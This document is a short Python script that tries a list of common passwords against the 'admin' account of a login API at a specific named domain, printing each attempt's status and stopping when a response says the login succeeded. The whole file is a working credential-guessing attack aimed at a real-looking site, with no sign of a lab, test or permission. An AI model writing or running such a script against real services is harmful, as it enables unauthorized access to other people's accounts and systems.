import requests

url = "https://oes.freshmilkstraightfromsource.com/api/login"

passwords = [
"password123",
"test123",
"123456",
"admin123",
"password"
]

for pwd in passwords:
    r = requests.post(url, json={
        "username":"admin",
        "password":pwd
    })

    print("Trying:", pwd, "Status:", r.status_code)

    if "Login successful" in r.text:
        print("Password found:", pwd)
        break
